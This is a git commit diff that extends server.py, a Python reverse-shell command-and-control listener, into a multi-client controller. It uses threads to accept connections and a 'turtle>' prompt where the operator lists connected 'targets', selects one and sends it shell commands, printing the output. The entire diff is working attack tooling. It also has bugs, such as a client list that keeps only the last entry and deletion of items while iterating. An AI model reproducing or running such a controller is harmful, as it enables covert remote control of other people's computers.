38258bf16fb9fea6cb24fc596d1a6a62d71be3ba
Vand <vand.filbert@gmail.com>
2019-10-11 01:46:47 +0700

    Multi Client

--- server.py
+++ server.py
@@ -1,6 +1,15 @@
 #!/usr/bin/python
 import socket
 import sys
+import threading
+import time
+from queue import Queue
+
+NUMEBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
+all_connections = []
+all_address = []
 
 #Create Socket
 def create_socket():
@@ -30,29 +39,105 @@ def bind_socket():
         print("Sockect binding eror" + str(msg) + "\n" + "Retrying...")
         bind_socket()
 
-#estanlish connection
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been establish! |" + "IP" + address[0] + "| Port" + str(address[1]))
-    send_commands(conn)
-    conn.close()
+def accepting_connections():
+    for c in all_connections:
+        c.close()
 
-#sending commands
-def send_commands(conn):
+    del all_connections[:]
+    del all_address[:]
+
     while True:
-        cmd = input()
-        if cmd == "quit":
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+        try:
+            conn, address = s.accept()
+            s.setblocking(1) #prevents timeout
 
-def main():
-    create_socket()
-    bind_socket()
-    socket_accept()
+            all_connections.append(conn)
+            all_address.append(address)
 
-main()
+            print("Connection has been establish :" + address[0])
+
+        except:
+            print("ERROR accepting connection")
+
+#make interface
+def start_turtle():
+    while True:
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("Command not recognized")
+
+#display list connection
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_address[i]
+            continue
+        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
+    print("----Clients----" + "\n" + results)
+
+#selected target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '') #targetid
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to : " + str(all_address[target][0]))
+        print(str(all_address[target][0]) + ">", end="")
+        return conn
+    except:
+        print("Selection not valid")
+        return None
+
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+#create worker
+def create_workers():
+    for _ in range(NUMEBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+#Do next job in the queue
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+
+        queue.task_done()
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+create_workers()
+create_jobs()
